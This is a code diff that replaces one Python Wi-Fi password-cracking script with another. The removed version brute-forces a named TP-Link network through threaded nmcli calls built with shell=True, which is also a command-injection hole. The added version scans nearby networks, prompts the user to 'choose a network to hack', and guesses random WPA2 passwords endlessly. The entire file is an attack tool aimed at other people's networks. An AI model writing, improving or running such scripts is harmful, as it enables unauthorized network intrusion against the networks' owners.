@@ -1,48 +1,58 @@
-import itertools
-import string
-import threading
+import pywifi
+from pywifi import const
 import time
-import subprocess
+import random
+import string
 
-# Функция для проверки пароля
-def check_password(ssid, password):
-    try:
-        # Используем команду для подключения к Wi-Fi
-        command = f"nmcli dev wifi connect {ssid} password {password}"
-        result = subprocess.run(command, shell=True, capture_output=True, text=True)
-        
-        # Если пароль верный, выводим его
-        if "successfully" in result.stdout:
-            print(f"Пароль найден: {password}")
-            return True
-    except Exception as e:
-        print(f"Ошибка при проверке пароля: {e}")
-    return False
+def get_available_networks():
+    wifi = pywifi.PyWiFi()
+    iface = wifi.interfaces()[0]
+    iface.scan()
+    time.sleep(2)
+    networks = iface.scan_results()
+    return networks
 
-# Функция для генерации и проверки паролей в потоке
-def brute_force_thread(ssid, start, end):
-    for length in range(start, end):
-        for guess in itertools.product(string.ascii_letters + string.digits, repeat=length):
-            password = ''.join(guess)
-            if check_password(ssid, password):
-                return
+def generate_password(length=8):
+    characters = string.ascii_letters + string.digits + string.punctuation
+    return ''.join(random.choice(characters) for i in range(length))
 
-# Основная функция
+def try_connect(iface, ssid, password):
+    profile = pywifi.Profile()
+    profile.ssid = ssid
+    profile.auth = const.AUTH_ALG_OPEN
+    profile.akm.append(const.AKM_TYPE_WPA2PSK)
+    profile.cipher = const.CIPHER_TYPE_CCMP
+    profile.key = password
+
+    iface.remove_all_network_profiles()
+    tmp_profile = iface.add_network_profile(profile)
+
+    iface.connect(tmp_profile)
+    time.sleep(3)
+    if iface.status() == const.IFACE_CONNECTED:
+        print(f"Successfully connected to {ssid} with password: {password}")
+        return True
+    else:
+        print(f"Failed to connect to {ssid} with password: {password}")
+        return False
+
 def main():
-    ssid = "TP-Link_BB78" # Замените на имя вашей Wi-Fi сети
-    num_threads = 6
-    chunk_size = 5  # Размер диапазона для каждого потока
+    wifi = pywifi.PyWiFi()
+    iface = wifi.interfaces()[0]
 
-    threads = []
-    for i in range(num_threads):
-        start = i * chunk_size + 1
-        end = start + chunk_size
-        thread = threading.Thread(target=brute_force_thread, args=(ssid, start, end))
-        threads.append(thread)
-        thread.start()
+    networks = get_available_networks()
+    print("Available networks:")
+    for i, network in enumerate(networks):
+        print(f"{i + 1}. {network.ssid}")
 
-    for thread in threads:
-        thread.join()
+    choice = int(input("Choose a network to hack (enter number): ")) - 1
+    target_ssid = networks[choice].ssid
+
+    while True:
+        password = generate_password()
+        print(f"Trying password: {password}")
+        if try_connect(iface, target_ssid, password):
+            break
 
 if __name__ == "__main__":
     main()
